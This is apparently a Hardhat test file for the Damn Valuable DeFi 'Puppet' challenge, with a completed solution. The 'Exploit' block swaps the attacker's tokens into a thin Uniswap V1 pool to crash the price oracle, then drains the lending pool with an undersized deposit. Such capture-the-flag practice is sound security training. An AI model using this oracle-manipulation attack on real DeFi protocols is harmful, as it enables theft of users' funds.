import * as exchangeJson from "../../build-uniswap-v1/UniswapV1Exchange.json";
import * as factoryJson from "../../build-uniswap-v1/UniswapV1Factory.json";

import { ethers } from 'hardhat';
import { expect } from 'chai';
import { BigNumber } from "@ethersproject/bignumber";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { DamnValuableToken, PuppetPool } from "../../typechain";
import { Contract, ContractFactory } from "@ethersproject/contracts";

// Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
function calculateTokenToEthInputPrice(tokensSold: BigNumber, tokensInReserve: BigNumber, etherInReserve: BigNumber) {
    return tokensSold.mul(ethers.BigNumber.from('997')).mul(etherInReserve).div(
        (tokensInReserve.mul(ethers.BigNumber.from('1000')).add(tokensSold.mul(ethers.BigNumber.from('997'))))
    )
}

describe('[Challenge] Puppet', function () {
    let deployer: SignerWithAddress, attacker: SignerWithAddress;
    let token: DamnValuableToken, exchangeTemplate: Contract, uniswapFactory: Contract, uniswapExchange: Contract, lendingPool: PuppetPool

    // Uniswap exchange will start with 10 DVT and 10 ETH in liquidity
    const UNISWAP_INITIAL_TOKEN_RESERVE = ethers.utils.parseEther('10');
    const UNISWAP_INITIAL_ETH_RESERVE = ethers.utils.parseEther('10');

    const ATTACKER_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('1000');
    const ATTACKER_INITIAL_ETH_BALANCE = ethers.utils.parseEther('25');
    const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('100000')

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const UniswapExchangeFactory = new ethers.ContractFactory(exchangeJson.abi, exchangeJson.evm.bytecode, deployer);
        const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.evm.bytecode, deployer);

        const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
        const PuppetPoolFactory = await ethers.getContractFactory('PuppetPool', deployer);

        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x15af1d78b58c40000", // 25 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ATTACKER_INITIAL_ETH_BALANCE);

        // Deploy token to be traded in Uniswap
        token = await DamnValuableTokenFactory.deploy();

        // Deploy a exchange that will be used as the factory template
        exchangeTemplate = await UniswapExchangeFactory.deploy();

        // Deploy factory, initializing it with the address of the template exchange
        uniswapFactory = await UniswapFactoryFactory.deploy();
        await uniswapFactory.initializeFactory(exchangeTemplate.address);

        // Create a new exchange for the token, and retrieve the deployed exchange's address
        let tx = await uniswapFactory.createExchange(token.address, { gasLimit: 1e6 });
        const { events } = await tx.wait();
        uniswapExchange = UniswapExchangeFactory.attach(events[0].args.exchange);

        // Deploy the lending pool
        lendingPool = await PuppetPoolFactory.deploy(
            token.address,
            uniswapExchange.address
        );

        // Add initial token and ETH liquidity to the pool
        await token.approve(
            uniswapExchange.address,
            UNISWAP_INITIAL_TOKEN_RESERVE
        );
        await uniswapExchange.addLiquidity(
            0,                                                          // min_liquidity
            UNISWAP_INITIAL_TOKEN_RESERVE,
            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
            { value: UNISWAP_INITIAL_ETH_RESERVE, gasLimit: 1e6 }
        );

        // Ensure Uniswap exchange is working as expected
        expect(
            await uniswapExchange.getTokenToEthInputPrice(
                ethers.utils.parseEther('1'),
                { gasLimit: 1e6 }
            )
        ).to.be.eq(
            calculateTokenToEthInputPrice(
                ethers.utils.parseEther('1'),
                UNISWAP_INITIAL_TOKEN_RESERVE,
                UNISWAP_INITIAL_ETH_RESERVE
            )
        );

        // Setup initial token balances of pool and attacker account
        await token.transfer(attacker.address, ATTACKER_INITIAL_TOKEN_BALANCE);
        await token.transfer(lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);

        // Ensure correct setup of pool. For example, to borrow 1 need to deposit 2
        expect(
            await lendingPool.calculateDepositRequired(ethers.utils.parseEther('1'))
        ).to.be.eq(ethers.utils.parseEther('2'));

        expect(
            await lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
        ).to.be.eq(POOL_INITIAL_TOKEN_BALANCE.mul('2'));
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        await token.connect(attacker).approve(uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE);
        const deadline = (await ethers.provider.getBlock("latest")).timestamp * 2;

        await uniswapExchange.connect(attacker).tokenToEthSwapInput(ATTACKER_INITIAL_TOKEN_BALANCE.sub(1), 1, deadline);

        const depositRequired = await lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)

        await lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, { value: depositRequired })

    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool        
        expect(
            await token.balanceOf(lendingPool.address)
        ).to.be.eq('0');
        expect(
            await token.balanceOf(attacker.address)
        ).to.be.gt(POOL_INITIAL_TOKEN_BALANCE);
    });
});